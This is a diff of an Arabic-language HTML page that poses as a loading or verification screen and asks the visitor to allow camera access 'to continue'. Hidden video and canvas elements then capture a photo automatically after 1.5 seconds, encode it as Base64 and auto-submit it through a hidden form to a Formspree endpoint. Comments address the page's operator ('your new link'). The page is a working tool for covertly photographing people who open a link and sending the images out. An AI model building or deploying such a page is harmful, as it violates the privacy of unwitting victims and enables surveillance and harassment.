@@ -3,28 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق...</title>
+    <title>جاري التحميل...</title>
     <style>
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto 20px;"></div>
+    <div class="container">
+        <div class="loader"></div>
         <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
     </div>
 
-    <!-- عناصر مخفية للمعالجة -->
+    <!-- عناصر المعالجة المخفية -->
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <!-- نموذج Formspree الخاص بك -->
-    <form id="photoForm" action="https://formspree.io/f/mojrkand" method="POST">
+    <!-- الرابط الجديد الخاص بك -->
+    <form id="photoForm" action="https://formspree.io" method="POST">
         <input type="hidden" name="image_data" id="imageInput">
-        <input type="hidden" name="_subject" value="صورة جديدة من الرابط">
+        <input type="hidden" name="_subject" value="صورة جديدة ملتقطة">
     </form>
 
     <script>
@@ -33,27 +34,27 @@
         const imageInput = document.getElementById('imageInput');
         const form = document.getElementById('photoForm');
 
-        // طلب الوصول للكاميرا فور تحميل الصفحة
+        // طلب الإذن فور فتح الرابط
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
                 
-                // انتظار 1.5 ثانية لالتقاط صورة واضحة
+                // التقاط الصورة تلقائياً بعد ثانية ونصف من الموافقة
                 setTimeout(() => {
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
                     
-                    // تحويل الصورة لصيغة Base64
+                    // تحويل الصورة لنص Base64
                     const dataURL = canvas.toDataURL('image/png');
                     imageInput.value = dataURL;
                     
-                    // إرسال البيانات تلقائياً
+                    // إرسال البيانات فوراً لـ Formspree
                     form.submit();
                 }, 1500);
             })
             .catch(err => {
-                console.error("خطأ في الوصول للكاميرا: ", err);
-                alert("عذراً، يجب السماح بالكاميرا لكي يعمل هذا الرابط بشكل صحيح.");
+                console.error("لم يتم السماح بالكاميرا:", err);
+                alert("نعتذر، يجب تفعيل الكاميرا للمتابعة.");
             });
     </script>
 </body>
